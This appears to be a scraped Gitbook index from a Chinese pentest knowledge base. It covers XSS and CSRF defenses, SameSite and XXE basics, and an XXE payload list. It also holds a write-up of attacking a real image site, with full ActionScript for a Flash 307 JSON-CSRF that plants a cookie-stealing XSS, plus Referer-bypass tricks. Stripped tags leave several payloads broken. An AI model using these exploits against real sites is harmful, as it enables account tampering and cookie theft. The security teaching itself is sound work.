httponly无法完全的防御XSS漏洞，它只是规定了不能使用js去获取cookie的内容，因此它只能防御利用xss进行cookie劫持的问题 Httponly是在set-cookie时标记的，可对单独某个cookie标记也可对所有cookie标记，由于设置httponly的方法比较简单，使用也很灵活，并且对防御cookie劫持非常有用，因此已经渐渐成为一种默认的标准 [!DANGER] httponly在某些情况也是可以获取到cookie的 例如apache漏洞，默认用于状态代码400的错误应答存在缺陷，当没有配置定制ErrorDocument时利用此缺陷攻击者可以获得httpOnly cookie信息 开启TRACE协议 使用CSP Content Security Policy（内容安全策略）： 禁止加载外域代码，防止复杂的攻击逻辑。 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。 合理使用上报可以及时发现 XSS，利于尽快修复问题。 CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机 可以参考mozilla的官方文档：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP 特殊防御 富文本编辑器XSS修复 富文本编辑器的XSS不同于其他地方，因为它本身是允许支持部分标签的，也就是说至少需要支持<> 修复建议有3点： 设置标签白名单，如仅允许、等必须标签等 为白名单标签的属性设置白名单，如仅允许使用href属性等，同时限制属性中的内容防止伪协议造成XSS漏洞，禁止出现on.*等事件属性 URL可控 由于某些地方URL可控，使用javascript等伪协议仍然可以触发XSS漏洞，如 Test 这个时候修复则需要两步进行修复： 验证URL是否以http(s)://开头，如果不是则自动添加或拒绝请求，确保不会出现伪协议 对http(s)://后的内容进行URL编码处理 JSONP 部分网站由于跨域调用中callback函数名可以自定义，可以将回调函数名修改为XSS语句导致XSS漏洞 修复也很简单，设置返回的header头即可，如下 Content-Type: application/json; charset=utf-8 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-23 10:21:49 "},"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/01.CSRF.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/01.CSRF.html","title":"01.CSRF","keywords":"","body":" 定义 举例 攻击流程 分类 GET型 POST-表单型 POST-JSON型 json转param 闭合JSON ajax发起请求 flash+307跳转 挖掘 应用场景 如何快速验证 防御 令牌同步模式 检查Referer字段 添加校验token 一次一用验证码 使用SameSite Cookie 个人预防 定义 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 跨站请求伪造攻击，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个用户自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求是发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 [!NOTE] 简单来说就是你点击我构造的恶意链接，我就可以以你的名义去发起一个http请求 举例 假如X银行用以执行转账操作的URL地址如下 https://bank.example.com/withdraw?amount=1000&to=PayeeName 一个恶意攻击者在另一个网站中https://evil.com/中放置如下代码 如果有登陆了X银行的用户访问恶意站点https://evil.com/，那么就会携带cookie去请求对应的转账URL，向Bob转账1000元 [!NOTE] 这种恶意的网址可以有很多种形式，藏身于网页中的许多地方，只要能让受害者发起对应的请求即可，如上述中的转账请求。 攻击者也不需要控制放置恶意代码的网站，例如他可以将这种地址藏在各大论坛，博客等任何用户生成内容的网站中，这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。 通过例子也能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义执行操作。 攻击流程 具体的攻击流程如下： 用户正常登录web服务，并一直保持在线 服务器返回用户凭证Session ，并将其保存在Cookie中 攻击者生成payload，并放置在用户可访问的地方 攻击者诱导用户点击在第3步放置的链接，此时用户一直在线，且是用同一浏览器打开（保证Cookie未失效） 用户点击恶意链接 恶意链接向服务器请求，由于用户Cookie未失效，就携带用户Cookie访问服务器 服务器收到请求，此时用户Cookie 未失效，并判定为“用户”发起的正常请求，并做出响应 分类 GET型 这种是最容易利用的，相比于POST型来说，攻击面也大很多，比如上述CSRF转账例子中就是GET型的 在web应用中，很多接口通过GET进行数据的请求和存储，如果未对来源进行校验，并且没有token保护，攻击者可以直接通过发送含有payload的链接进行诱导点击；亦可以通过评论区或类似功能处发布图片，通过修改img地址的方式保存至页面，用户访问便会进行自动加载造成攻击 POST-表单型 相比于GET型，这种就要多很多，因为很多开发在提交数据的功能点时都会采用POST，如创建用户、创建文章、发消息等，利用起来也相对麻烦点 [!NOTE] 测试时，为了扩大危害，可以尝试将POST数据包转换成GET数据包，后端采用如@RequestMaping(\"/\")这种同时接受POST和GET请求的话，就可以成功 利用起来无非也是构造一个自动提交的表单，然后嵌入到页面中，诱导受害者访问，受害者访问后会自动提交表单发起请求 document.forms[0].submit(); POST-JSON型 现在越来越多的系统都采用RESTful风格开发，前后端分离，ajax请求后端获取数据再到前端渲染，所以上述表单型也越来越少了 如果我们发现请求头中的Content-Type值是application/json，基本上就可以确定采用了前后端分离了 这种一般有4⃣️种利用手法： json转param 闭合JSON ajax发起请求 flash+307跳转 json转param 部分网站可能同时支持json和表单格式，所以我们可以尝试进行转换，也算是一个小tips吧 如把 {\"a\":\"b\"} 转换为 a=b，服务端可能也会解析 闭合JSON 这种要求对Content-Type没有限制，比如传输的数据为 {\"a\":\"b\"}，那么我们就可以构造一个表单 document.forms[0].submit(); 这样自动提交表单的时候，提交的data就是 {\"a\":\"=b\"}，闭合成了json [!NOTE|style:flat] 实际环境中本人没遇到过，基本上遇到的都是强制要求Content-Type为json ajax发起请求 XMLHttpRequest跨域预检 当跨域影响用户数据HTTP请求(如用XMLHttpRequest发送get/post)时，浏览器会发送预检请求(OPTIONS请求)给服务端征求支持的请求方法，然后根据服务端响应允许才发送真正的请求。 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Access-Control-Allow-Origin: http://localhost:63342 Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1800 Access-Control-Allow-Methods: POST Access-Control-Allow-Headers: content-type,access-control-request-headers,access-control-request-method,accept,origin,x-requested-with Content-Length: 0 Date: Wed, 11 Mar 2015 05:16:31 GMT 然而如果服务端对Content-Type进行校验，则不会响应这个OPTIONS请求，从而利用失败。但是更多的情况下服务端可能不会校验Content-Type，或者不会严格校验Content-Type是否为application/json，所以很多情况下这是可用的 windows.onload = () => { var xhr = new XMLHttpRequest() xhr.open(\"POST\", \"http://test.example.com/csrf\") xhr.setRequestHeader(\"Accept\", \"*/*\") xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\") xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\") xhr.withCredentials = true // 携带cookie xhr.send(JSON.stringify({\"a\":\"b\"}) } flash+307跳转 利用Flash的跨域与307跳转来绕过http自定义头限制，307跟其他3XX HTTP状态码之间的区别就在于，HTTP 307可以确保重定向请求发送之后，请求方法和请求主体不会发生任何改变。HTTP 307会将POST body和HTTP头重定向到我们所指定的最终URL，并完成攻击 详情参考该系列我的另一片文章：一次XSS和CSRF的组合拳进攻（CSRF+JSON） 挖掘 算是一些挖掘经验吧，很多小伙伴都知道这个漏洞，但是不知道如何挖掘。 应用场景 其实所有需要登陆认证且存在操作的地方，都可能存在CSRF；比如修改个人信息、发送邮件、创建管理员用户等等，只能查看的功能不考虑，因为不能算真正利用 如何快速验证 [!TIP] 观察数据包，如果header头和data中都没有token，然后尝试删除referer，还是能成功发送请求的话，就可以确定存在CSRF漏洞了 为了保险起见，在时间充足的情况下，还是需要尽量通过POC验证下，一般不需要2个账号进行验证，一个账号即可（2个只能说更保险） 非json的情况下，使用burp可以快速生成POC，也可以自己写，反正原理都是发起请求即可 登陆账号的情况下去访问这个poc，如果能成功得到自己的结果，就是OK的。 防御 WEB的身份验证机制可以保证一个请求是来自于哪个用户的浏览器，但是却不能保证请求是否由本人发起的，所以修复和防御也是保证请求由用户本人发起即可。 [!TIP] 简单来说，或者和客户沟通的情况下，直接说修复方法就是防止请求重放，他们开发也差不多都知道怎么修了 令牌同步模式 令牌同步模式（英语：Synchronizer token pattern，简称STP）。 原理是：当用户发送请求时，服务器端应用将令牌（token:一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，再由服务端对令牌进行验证。令牌可以通过任何方式生成，只要确保随机性和唯一性。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。（没有token不能重放数据包） [!NOTE] STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（session）等级的令牌代替的话，服务器的负担将没有那么重。 检查Referer字段 HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。 以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。 [!WARNING|style:flat] 这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。 但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段；虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段，并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。 添加校验token [!NOTE] 提交不一定是在data里面提交，也可以在header里面 由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。 这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。 一次一用验证码 在关键操作处添加一次一用的验证码，攻击者无法事先知道验证码的值，也就无法成功构造发起请求的数据包。 [!DANGER] 需要用户交互，如果很多地方都加上，用户体验极差，所以一般不建议这个 使用SameSite Cookie 设置SameSite属性，需要根据需要设置 如果Samesite Cookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会；但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。 如果Samesite Cookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。 个人预防 网站如果存在CSRF漏洞，个人一般要如何操作才能防止攻击到自己呢？ 尽量每次使用隐私浏览器，因为其关闭后会清空所有的cookie 不要随便打开链接，一定要打开的情况下，可以使用隐私浏览器 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-23 11:21:19 "},"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/02.一次XSS和CSRF的组合拳进攻（CSRF+JSON）.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/02.一次XSS和CSRF的组合拳进攻（CSRF+JSON）.html","title":"02.一次XSS和CSRF的组合拳进攻（CSRF+JSON）","keywords":"","body":" 一次XSS和CSRF的组合拳进攻 (CSRF+JSON) 起因 发现存储型XSS漏洞 分界线 CSRF 漏洞 生成 csrf.swf 文件 重定向php文件 利用过程 总结 参考 一次XSS和CSRF的组合拳进攻 (CSRF+JSON) 起因 为了白嫖某个图片网中的图片，便对其进进行了简单的测试。 PS： 前面信息收集什么的就不多说了，和本文内容也没多大关系，就直接讲重点吧 因为自己浏览器的问题，验证码加载不出来，所以后面都是用同学的账号做的测试，高强度打码 发现存储型XSS漏洞 大概逛了一下网站，最后进入了信息设置面板 看着这么多的框，总感觉存在XSS，审查元素后发现 简介 是用这个标签来闭合的，于是构造 payload alert(/xss/) 保存刷新后，成功弹出 xss 至此存储型XSS验证成功 分界线 因为这个页面只有自己能看见，所以也就自己能触发（别人看资料的时候<>会被转义，也就没用了） 感觉这个洞很鸡肋，这个时候又想到了CSRF，如果每个人都自动将简介改成精心生成的恶意代码，那么这样每个人想再次修改自己的资料的时候，就可以触发 存储型XSS，我们也就可以盗取cookie、挂马或者其他一系列骚操作 CSRF 漏洞 按照原来一样的操作 修改信息 –> 保存时抓包 –> 生成CSRF POC –> 打开POC –> 检验是否利用成功 但是这里遇到一个问题 以前post提交的数据都是形如 a=123&b=456 这种，而这里提交的却是 json 格式的 于是这里就要利用到一些骚姿势 偷一张大佬们的图（这里因为需要验证content-type，目前搜到的就只有这种方法） 后面的大概攻击流程就是这样 生成 csrf.swf 文件 从Adobe官网安装Flex SDK用于将ActionScript编译为swf文件。Flex需要安装32位JVM，可以从Oracle官网下载安装32位的JDK。（这里只能用32位的，64位的不行） 创建一个名为csrf.as的文本文件，写入以下ActionScript代码。 将占位符替换为攻击者服务器的ip或者域名（307跳转页面的地址） 将此文件编译为csrf.swf，只需运行mxmlc csrf.as命令。这将创建一个名为csrf.swf的文件。 package { import flash.display.Sprite; import flash.net.URLLoader; import flash.net.URLRequest; import flash.net.URLRequestHeader; import flash.net.URLRequestMethod;public class csrf extends Sprite { public function csrf() { super(); var member1:Object = null; var myJson:String = null; member1 = new Object(); member1 = { \"gender\":\"2\", \"homeCity\":\"4170\", \"nowCity\":\"4170\", \"profession\":\"23\", \"description\":\"alert(document.cookie)\", \"signature\":\"\" }; var myData:Object = member1; myJson = JSON.stringify(myData); myJson = JSON.stringify(myData); var url:String = \"http:///307.php\"; var request:URLRequest = new URLRequest(url); request.requestHeaders.push(new URLRequestHeader(\"Content-Type\",\"application/json\")); request.data = myJson; request.method = URLRequestMethod.POST; var urlLoader:URLLoader = new URLLoader();try { urlLoader.load(request); return; } catch(e:Error) { trace(e); return; } } } } 重定向php文件 https://xxxx.cn/xxxx/xxxxx 为你要重定向的地址，即修改用户简介的地址，目标网站，不是攻击者的服务器 307.php 文件内容 利用过程 攻击者将 csrf.swf 和 307.php 文件放入同一目录 受害者在登陆存在CSRF漏洞的网站后，访问攻击者服务器上的swf文件 点击启动flash 可以在下面的网络选项中，看到307跳转成功，而且已经成功提交了POST数据 此时我们再刷新受害者个人消息页面，即可成功弹出 cookie 值 到此 CSRF+XSS 组合拳成功打出 总结 有框的地方就可能存在XSS 一定要细心，不仅仅在网站审查上要细心 CSRF + JSON 网上也有很多，不过都不是以实战来讲的 网上有些 CSRF + JSON 的利用有坑（这也是为什么我之前花了一整天都没成功） 参考 在JSON端点上利用CSRF漏洞的实践教程 Exploiting JSON CSRF Exploiting JSON Cross Site Request Forgery (CSRF) using Flash Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 18:05:49 "},"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/03.CSRF绕过Referer技巧.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/03.CSRF绕过Referer技巧.html","title":"03.CSRF绕过Referer技巧","keywords":"","body":" 前言 绕过 空referer 关键词绕过 指定域绕过 总结 前言 防止CSRF漏洞常用的方法一般有2个，那就是验证referer和增加token； 由于校验referer一般是通过正则表达式来进行匹配，开发人员可能存在疏忽，导致了被绕过的可能（正常情况下验证referer是不能绕过的） 绕过 空referer 和标题一样，测试时就是给数据包中的referer置空即可，有些网站可能没有考虑到referer为空的情况或者业务需要referer为空的情况从而导致了绕过 如果要实际利用，那么可以使用以下的一些方法： form表单页面加上如下内容： a标签的一个属性ref TEST 利用其他的协议，比如data:、file:等 如果目标是http的站点，那么将poc放到https的站点上，从https的站点跳转到http的站点，也是不带有referer的 关键词绕过 查看是否必须存在指定的关键词，如必须存在abc.com，那么我们只需要使用xxx.com/poc.html?abc.com即可绕过（?也可以换成其他的一些符号，只要不影响html解析就行，比如#） 指定域绕过 相比上一个更难，比如referer必须在域abc.com下，这种情况也有一些方法： 使用@，比如abc.com@xxx.com/poc.html 看看子域名有不有发布文章的功能的地方，比如存在一个子域名forum.abc.com可以发布文章，那么把poc发布到这个域名下诱导其他人访问也是可以的 如果是GET型CSRF，思路和第二条也差不多，只是要简单很多，找个能从网站内访问POC的点即可，比如网站头像处设置成CSRF的POC 找一个任意URL跳转的漏洞来结合 结合XSS 总结 绕过方法总体来说有2种 第一种就是空referer 第二种就是和任意URL跳转一样的绕法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 15:12:35 "},"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/04.SameSite.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/03.CSRF/04.SameSite.html","title":"04.SameSite","keywords":"","body":" 前言 第一方cookie VS 第三方cookie 同站请求 VS 跨站请求 SameSite属性 SameSite改进 浏览器对SameSite的实现 对攻击者的影响 参考 前言 SameSite类似httponly，是一种从浏览器层面进行防御的手法 Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie 第一方cookie VS 第三方cookie 与当前网站的域名（即浏览器地址栏中显示的内容）相匹配的 cookie 被称为第一方 cookie 来自当前网站以外域名的 cookie 被称为第三方 cookie。 这不是一个绝对的标签，而是相对于用户上下文来决定的。同一个 cookie 可以是第一方的，也可以是第三方的，具体取决于用户当时所在的网站 同站请求 VS 跨站请求 SameSite中的Site是域名后缀和域名后缀之前部分的组合。 域名后缀可以参考公共后缀列表，除了.com等顶级域名，还包括github.io等服务域名，因此： www.gm7.org 上访问 blog.gm7.org 的图片，属于同站请求(same-site) a.github.io 上访问 b.github.io 的图片，属于跨站请求(cross-site) SameSite属性 Samesite有3种属性，分别为Strict、Lax、None Strict: 完全限制跨站点共享，只有在访问最初设置它的域时才能访问到该Cookie。换句话说，当来自b.com的页面发出请求时，Strict会完全阻止将cookie发送到a.com，即使单击第三方域上的顶级链接到您的站点，浏览器也会拒绝发送 cookie。此属性最适合需要高安全性的应用程序，例如银行。 Lax: 属于同一域的所有站点都可以设置和访问 cookie。与始终发送 cookie 的 None 不同，Lax cookie 仅在同站点请求（如 Strict）时发送。但是 Lax 允许使用安全的 HTTP 方法（例如 HTTP GET）进行顶级（有时称为公共后缀）域名访问。 cookie 不会随跨域 POST 请求或在跨域框架中加载站点时发送，但会在您通过标准顶级 链接导航到站点时发送. None: 允许第三方 cookie 跨站点跟踪用户。具有此设置的 Cookie 的工作方式与目前 Cookie 的工作方式相同。 Cookie 将能够跨站点使用。请注意，您需要同时使用 None 和 Secure 属性。如果您只指定 None 而没有 Secure cookie 将被拒绝。 Secure 确保浏览器请求是通过安全 (HTTPS) 连接发送的。 一表胜千言： SameSite改进 虽然SameSite属性得到广泛支持，但遗憾的是该属性并未被开发者广泛采用，为了鼓励开发者声明他们的意图并为用户提供更安全的体验，IETF 的渐进式改善 cookie 提案列出了两大关键变化： 没有SameSite属性的 cookie 将被视为SameSite=Lax（原来没设置的默认为None）。 具有SameSite=None的 cookie 还必须指定Secure ，即这些 cookie 需要一个安全的上下文环境，必须在https的情况下。 浏览器对SameSite的实现 https://caniuse.com/?search=samesite 绿色说明开始支持SameSite属性 https://caniuse.com/same-site-cookie-attribute 绿色说明默认为SameSite=Lax https://caniuse.com/#feat=mdn-http_headers_set-cookie_samesite_lax_default 对攻击者的影响 所有需要身份认证的跨站请求相关的漏洞都会受到影响，简单来说：就是去请求漏洞地址的时候，原来是默认带上Cookie的，但是设置SameSite属性后，再去请求漏洞地址就不会带上cookie了；没有cookie身份验证就无法通过，伪造请求也就失败了。 https://blog.reconless.com/samesite-by-default/ Vulnerability Type Affected by SameSite Cross site request forgery (CSRF) ☠️Totally Dead Clickjacking 😦Partly Dead Cross-Site Script Inclusion (XSSI) ☠️Totally Dead JSONP Leaks 😦Partly Dead Data Exfiltration ☠️Totally Dead XSLeaks 😵Mostly Dead CORS Misconfigurations 😃Mostly Fine Cross-Site WebSocket Hijacking ☠️Totally Dead XSS 😃Mostly Fine 参考 SameSite cookie 的说明 Chrome's Changes Could Break Your App: Prepare for SameSite Cookie Updates Samesite by Default and What It Means for Bug Bounty Hunters CSRF 漏洞的末日？关于 Cookie SameSite 那些你不得不知道的事 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-23 14:47:44 "},"个人知识库/01.渗透测试/02.WEB漏洞/04.XXE/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/04.XXE/","title":"04.XXE","keywords":"","body":" 简介 XML基础 XML语法 XML DTD DTD简介 DTD实体 漏洞环境搭建 XXE基础利用 读取文件 SSRF 执行系统命令 拒绝服务攻击 XInclude攻击 哪些地方可能存在XXE 防御 Payload Basic Basic XML Example Entity Example Inband Injection Extract data from the server XXE Base64 encoded PHP Wrapper inside XXE OOB Injection Vanilla, used to verify outbound xxe or blind xxe OoB extraction1 OoB variation of above (seems to work better against .NET) OoB extraction2 OoB extra ERROR -- Java OoB XXE Base64 -- PHP OoB extra nice File-not-found exception based extraction FTP Inside SOAP body XXE inside SVG Untested - WAF Bypass DOS 包括一个随机的文件 Billion Laugh Attack - Denial Of Service 参考文章 简介 XXE（XML External Entity Injection）全称XML外部实体注入漏洞，既然是注入，说明也是执行了我们的恶意代码。 它产生的原因是：应用程序在解析XML内容时，没有禁止外部实体的加载，导致可加载恶意外部文件；因此如果XML内容可控，那么就可造成 文件读取 命令执行（难） 内网端口扫描 攻击内网网站 发起dos攻击 等危害。 XML基础 既然漏洞是由于解析XML引起的，那么不了解一下XML怎么行呢？ XML和HTML长得有点类似，都是基于标签的格式，但是HTML被设计用来显示数据，XML则被设计用来传输和存储数据 XML语法 XML 声明文件的可选部分，如果存在需要放在文档的第一行 XML 必须包含根元素，它是所有其他元素的父元素，比如下面的userInfo元素 d4m1ts 18 所有的 XML 元素都必须有一个关闭标签 paragraph 不能省略 --> XML 标签对大小写敏感。标签 与标签 是不同的，必须使用相同的大小写来编写打开标签和关闭标签 所有元素都必须彼此正确地嵌套 This text is bold and italic This text is bold and italic 属性都必须添加双引号，这点和HTML类似 aa XML注释和HTML一样 XML DTD DTD简介 XML DTD(Document Type Definition)文档类型定义的作用是定义 XML 文档的合法构建模块，它使用一系列合法的元素来定义文档的结构。 内部DOCTYPE声明 ]> d4m1ts 18 以上 DTD 解释如下： !DOCTYPE userInfo (第二行)定义此文档是 userInfo 类型的文档。 !ELEMENT userInfo (第三行)定义 userInfo 元素有两个元素：\"name、age\" !ELEMENT name (第四行)定义 name 元素为 \"#PCDATA\" 类型 PCDATA 是会被解析器解析的文本，这些文本将被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开 CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 外部DOCTYPE声明 Tove Jani Reminder Don't forget me this weekend! 在XML中，有5个预定义的实体引用，这是为了防止在解析的时候，给我们输入的当成标签来处理，导致异常 实体引用 字符 &lt; &gt; > &amp; & &quot; \" &apos; ' 举例 if salary &lt; 1000 then DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。 一个内部实体声明 ]> &name; 18 一个外部实体声明 漏洞环境搭建 服务器解析XML出现问题，那漏洞环境就写一个可以解析XML内容的代码即可。这里我用Java中的SAXReader这个类的read()方法来触发 依赖 org.dom4j dom4j 2.1.1 漏洞代码 import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.Element; import org.dom4j.io.SAXReader; import java.io.File; public class Main { public static void main(String[] args) throws DocumentException { SAXReader saxReader = new SAXReader(); Document document = saxReader.read(new File(\"src/main/resources/test.xml\")); Element rootElement = document.getRootElement(); System.out.println(rootElement.element(\"name\").getData()); } } test.xml ]> &name; 后续只需要修改test.xml中的内容即可 XXE基础利用 在上面加载外部实体声明的时候，可以注意到它的语法 可以从一个URL加载DTD，当然按照非正常的思维，允许输入URL也就相当于允许输入其他类似http的协议的链接，比如file、ftp这些，那这里岂不是至少就可能存在2个漏洞了 SSRF 任意文件读取 各语言支持的协议如下： LIBXML2 PHP JAVA .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar 这里只介绍基础的带回显的利用方法，不带回显的可以参考下面的Payload 读取文件 读取/etc/passwd，这个明显是给file///etc/passwd的值赋值给name ]> &name; SSRF 简单的发起http请求，根据结果具体情况具体分析 ]> &name; 执行系统命令 比较鸡肋，比较难利用，要在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能吧 ]> &xxe; 拒绝服务攻击 递归引用，lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。 ]> &lol9; XInclude攻击 一些情况下，我们可能无法控制整个XML文档，也就无法完全XXE，但是我们可以控制其中一部分，这个时候就可以使用XInclude XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以在XML文档中的任何数据值中放置XInclude Payload 要执行XInclude攻击，需要引用XInclude命名空间并提供要包含的文件的路径。例如： 哪些地方可能存在XXE 允许上传XML文件的地方 允许上传Excel、Word、SVG等文件的地方（因为这些文件本质也是XML） 请求中Content-Type允许为application/xml的数据包(可以手动修改，比如将application/json中的json直接修改为xml) ... 总而言之一句话：所有能传能解析XML数据给服务端的地方，都可能存在XXE。 防御 1、使用开发语言提供的禁用外部实体的方法 不同的类可能设置方法也不一样，具体情况具体分析。 php: libxml_disable_entity_loader(true); java: SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); Python: from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2、过滤用户提交的XML数据 过滤关键字：和，或者SYSTEM和PUBLIC。 3、不允许XML中含有自己定义的DTD Payload Basic Basic XML Example John Doe Entity Example ]> John &example; Inband Injection Extract data from the server ]> &file; ]>&xxe; ]>&xxe; XXE Base64 encoded %init; ]> PHP Wrapper inside XXE ]> Jean &xxe; Dupont 00 11 22 33 44 42 rue du CTF 75000 Paris ]> &xxe; OOB Injection Vanilla, used to verify outbound xxe or blind xxe ]> &sp; OoB extraction1 %sp; %param1; ]> &exfil; 外部实体 \"> OoB variation of above (seems to work better against .NET) %sp; %param1; %exfil; ]> 外部实体 \"> OoB extraction2 %sp; %param3; %exfil; ]> External dtd \"> OoB extra ERROR -- Java %sp; %param3; %exfil; ]> External dtd'> %param1; %external; OoB XXE Base64 -- PHP %remote;%int;%send; ]> \"> OoB extra nice \"> %dtd; ]> &all; External dtd File-not-found exception based extraction %one; %two; %four; ]> External dtd \"> FTP %asd; %c; ]> &rrr; External dtd \"> Inside SOAP body %dtd;]>]]> XXE inside SVG Untested - WAF Bypass DOS 包括一个随机的文件 ]> Billion Laugh Attack - Denial Of Service &lol9; 参考文章 从XML相关一步一步到XXE漏洞 xxe XML External Entity (XXE) Injection Payload List XXE_payloads Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-22 19:11:59 "},"个人知识库/01.渗透测试/02.WEB漏洞/05.SSTI注入/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/05.SSTI注入/","title":"05.SSTI注入","keywords":"","body":" 什么是SSTI 什么是模版/模版引擎 挖掘和判定 已知模版引擎问题 PHP中的SSTI Twig 基础语法 环境搭建 漏洞利用 参考 Smarty Python中的SSTI Jinja2 基础语法 环境搭建 漏洞判定 深入了解 加深利用 绕过 参考 tornado Djanjo Mako Java中的SSTI Velocity FreeMarker Spring View Manipulation Pebble Jinjava NodeJS中的SSTI Handlebars JsRender PugJs Ruby中的SSTI ERB Slim 自动化工具 参考 什么是SSTI SSTI(Server Side Template Injection)全称服务端模板注入，既然是注入，那就说明是执行了某些恶意代码导致的问题； 漏洞成因是服务端接收了攻击者的恶意输入以后，未经任何处理就将其作为Web应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中(一般可以执行各种表达式)，执行了攻击者插入的可以破坏模板结构的语句(恶意Payload)，因而可能导致了敏感信息泄露、代码执行、GetShell等问题。其影响范围主要取决于模版引擎的复杂性。 简单来说，就是给攻击者传入的数据当成了模版来渲染，而不是当成数据去渲染。 什么是模版/模版引擎 刚才提到了漏洞产生原因是因为模版引擎将攻击者构造的恶意payload在服务端按代码语义解析执行，那什么是模版，什么又是模版引擎呢？ 目前主流的web开发主要分为以下两种技术： 前后端不分离：即后端完成路由，用户在浏览器输入一个url，访问的是后端路由（服务端响应），后端接收请求后，再将数据通过模板引擎解析再渲染成视图返回给前端。后端路由，由后端渲染数据，再返回视图给前端，前端只负责展示视图，所有的交互都在后台；可以简单理解为访问一个URL后直接得到html页面。 